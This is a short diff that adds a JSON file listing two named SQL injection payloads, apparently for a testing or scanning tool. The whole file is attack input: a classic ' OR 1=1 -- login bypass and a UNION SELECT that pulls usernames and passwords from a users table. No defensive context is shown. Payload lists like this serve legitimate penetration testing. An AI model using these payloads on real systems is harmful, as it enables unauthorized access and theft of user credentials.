@@ -1,0 +1,10 @@
+[
+    {
+        "name": "Basic SQL Injection",
+        "payload": "' OR 1=1 --"
+    },
+    {
+        "name": "Union Attack",
+        "payload": "' UNION SELECT null, username, password FROM users --"
+    }
+]
